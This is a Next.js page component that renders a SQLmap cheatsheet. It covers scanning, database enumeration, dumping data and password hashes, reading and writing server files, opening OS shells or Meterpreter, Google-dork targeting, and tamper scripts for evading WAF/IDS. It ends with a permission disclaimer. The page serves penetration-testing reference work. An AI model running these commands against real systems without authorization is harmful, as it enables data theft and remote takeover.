'use client';

import React from 'react';
import Link from 'next/link';

export default function SqlmapCheatsheetPage() {
  return (
    <div className="max-w-4xl mx-auto pb-10">
      <h1 className="text-3xl font-bold mb-6">SQLmap Cheatsheet</h1>
      
      <div className="mb-8">
        <p className="mb-4">
          A handy cheatsheet for SQLmap, covering enumeration, injection techniques, file system access, and more.
        </p>
      </div>

      <section className="mb-8">
        <h2 className="text-2xl font-semibold mb-4">Basic Usage</h2>
        <div className="card mb-6">
          <ul className="list-disc pl-6 space-y-2">
            <li><code>sqlmap -u &lt;URL&gt;</code>: Basic scan of a URL for SQL injection.</li>
            <li><code>sqlmap -u &lt;URL&gt; --data="&lt;POST_DATA&gt;"</code>: Scan a URL with POST data.</li>
            <li><code>sqlmap -l &lt;log_file.log&gt;</code>: Parse targets from a Burp or WebScarab proxy log file.</li>
            <li><code>sqlmap -r &lt;request_file.txt&gt;</code>: Load HTTP request from a file.</li>
            <li><code>sqlmap -g "&lt;google_dork&gt;"</code>: Process Google dork results as target URLs.</li>
          </ul>
        </div>
      </section>

      <section className="mb-8">
        <h2 className="text-2xl font-semibold mb-4">Enumeration</h2>
        <div className="card mb-6">
          <ul className="list-disc pl-6 space-y-2">
            <li><code>sqlmap -u &lt;URL&gt; --dbs</code>: Enumerate databases.</li>
            <li><code>sqlmap -u &lt;URL&gt; -D &lt;database_name&gt; --tables</code>: Enumerate tables in a specific database.</li>
            <li><code>sqlmap -u &lt;URL&gt; -D &lt;database_name&gt; -T &lt;table_name&gt; --columns</code>: Enumerate columns in a specific table.</li>
            <li><code>sqlmap -u &lt;URL&gt; -D &lt;database_name&gt; -T &lt;table_name&gt; -C &lt;column_names&gt; --dump</code>: Dump data from specific columns.</li>
            <li><code>sqlmap -u &lt;URL&gt; --current-user</code>: Retrieve the current database user.</li>
            <li><code>sqlmap -u &lt;URL&gt; --current-db</code>: Retrieve the current database name.</li>
            <li><code>sqlmap -u &lt;URL&gt; --is-dba</code>: Detect if the current user is a DBA.</li>
            <li><code>sqlmap -u &lt;URL&gt; --users</code>: Enumerate database users.</li>
            <li><code>sqlmap -u &lt;URL&gt; --passwords</code>: Enumerate database user password hashes.</li>
            <li><code>sqlmap -u &lt;URL&gt; --roles</code>: Enumerate database user roles.</li>
            <li><code>sqlmap -u &lt;URL&gt; --schema</code>: Enumerate the entire database schema.</li>
          </ul>
        </div>
      </section>

      <section className="mb-8">
        <h2 className="text-2xl font-semibold mb-4">Optimization and Performance</h2>
        <div className="card mb-6">
          <ul className="list-disc pl-6 space-y-2">
            <li><code>--level=&lt;1-5&gt;</code>: Level of tests to perform (default: 1). Higher levels include more complex queries.</li>
            <li><code>--risk=&lt;1-3&gt;</code>: Risk of tests to perform (default: 1). Higher risks include potentially harmful queries.</li>
            <li><code>-p &lt;parameter&gt;</code>: Test a specific parameter (e.g., <code>-p id</code>).</li>
            <li><code>--threads=&lt;number&gt;</code>: Maximum number of concurrent HTTP(s) requests (default: 1).</li>
            <li><code>--dbms=&lt;DBMS&gt;</code>: Force back-end DBMS to this value (e.g., <code>MySQL</code>, <code>PostgreSQL</code>).</li>
            <li><code>--os=&lt;OS&gt;</code>: Force back-end DBMS operating system to this value (e.g., <code>Linux</code>, <code>Windows</code>).</li>
            <li><code>--batch</code>: Never ask for user input, use default behavior.</li>
            <li><code>--flush-session</code>: Flush session files for the current target.</li>
          </ul>
        </div>
      </section>

      <section className="mb-8">
        <h2 className="text-2xl font-semibold mb-4">Injection Techniques</h2>
        <div className="card mb-6">
          <div className="mb-4">
            <p className="mb-2"><code>--technique=&lt;techniques&gt;</code>: SQL injection techniques to use (e.g., <code>BEUSTQ</code>).</p>
            <ul className="list-disc pl-10">
              <li><code>B</code>: Boolean-based blind</li>
              <li><code>E</code>: Error-based</li>
              <li><code>U</code>: Union query-based</li>
              <li><code>S</code>: Stacked queries</li>
              <li><code>T</code>: Time-based blind</li>
              <li><code>Q</code>: Inline queries</li>
            </ul>
          </div>
          <ul className="list-disc pl-6 space-y-2">
            <li><code>--union-cols=&lt;range&gt;</code>: Specify range of columns for UNION query injection (e.g., <code>10-20</code>).</li>
            <li><code>--union-char=&lt;char&gt;</code>: Character to use for bruteforcing number of columns (default: <code>NULL</code>).</li>
          </ul>
        </div>
      </section>

      <section className="mb-8">
        <h2 className="text-2xl font-semibold mb-4">File System Access</h2>
        <div className="card mb-6">
          <ul className="list-disc pl-6 space-y-2">
            <li><code>sqlmap -u &lt;URL&gt; --file-read="&lt;file_path_on_server&gt;"</code>: Read a file from the back-end DBMS file system.</li>
            <li><code>sqlmap -u &lt;URL&gt; --file-write="&lt;local_file_path&gt;" --file-dest="&lt;remote_file_path_on_server&gt;"</code>: Write a local file to the back-end DBMS file system.</li>
          </ul>
        </div>
      </section>

      <section className="mb-8">
        <h2 className="text-2xl font-semibold mb-4">Operating System Access</h2>
        <div className="card mb-6">
          <p className="mb-2 text-yellow-500"><em>Note: These operations require advanced privileges</em></p>
          <ul className="list-disc pl-6 space-y-2">
            <li><code>sqlmap -u &lt;URL&gt; --os-shell</code>: Prompt for an interactive operating system shell.</li>
            <li><code>sqlmap -u &lt;URL&gt; --os-cmd="&lt;command&gt;"</code>: Execute an operating system command.</li>
            <li><code>sqlmap -u &lt;URL&gt; --os-pwn</code>: Prompt for an OOB shell, Meterpreter, or VNC.</li>
          </ul>
        </div>
      </section>

      <section className="mb-8">
        <h2 className="text-2xl font-semibold mb-4">Brute Force</h2>
        <div className="card mb-6">
          <ul className="list-disc pl-6 space-y-2">
            <li><code>sqlmap -u &lt;URL&gt; --common-tables</code>: Brute force common table names.</li>
            <li><code>sqlmap -u &lt;URL&gt; --common-columns</code>: Brute force common column names.</li>
          </ul>
        </div>
      </section>

      <section className="mb-8">
        <h2 className="text-2xl font-semibold mb-4">Miscellaneous Options</h2>
        <div className="card mb-6">
          <ul className="list-disc pl-6 space-y-2">
            <li><code>--forms</code>: Parse and test forms on the target URL.</li>
            <li><code>--crawl=&lt;depth&gt;</code>: Crawl the website starting from the target URL.</li>
            <li><code>--cookie="&lt;cookie_string&gt;"</code>: Set HTTP Cookie header value.</li>
            <li><code>--user-agent="&lt;user_agent_string&gt;"</code>: Set HTTP User-Agent header value.</li>
            <li><code>--referer="&lt;referer_string&gt;"</code>: Set HTTP Referer header value.</li>
            <li><code>--headers="&lt;headers_string&gt;"</code>: Extra headers (e.g., <code>Accept-Language: fr\nETag: 123</code>).</li>
            <li><code>--proxy="&lt;proxy_address:port&gt;"</code>: Use an HTTP proxy.</li>
            <li><code>--tor</code>: Use Tor anonymity network.</li>
            <li><code>--random-agent</code>: Use a randomly selected HTTP User-Agent.</li>
            <li><code>-v &lt;0-6&gt;</code>: Verbosity level (0=silent, 1=default, ..., 6=debug).</li>
            <li><code>--tamper=&lt;tamper_script&gt;</code>: Use given tamper script(s) to evade WAF/IDS (e.g., <code>space2comment</code>).</li>
          </ul>
        </div>
      </section>

      <div className="mt-6 card bg-gray-800 text-amber-300 p-4">
        <p className="font-semibold">
          <strong>Disclaimer:</strong> Use SQLmap responsibly and only on systems you have explicit permission to test. Unauthorized access or attacks are illegal.
        </p>
      </div>

      <div className="mt-8 pt-6 border-t border-gray-700">
        <Link href="/docs" className="text-primary hover:underline">
          &larr; Back to Documentation
        </Link>
      </div>
    </div>
  );
} 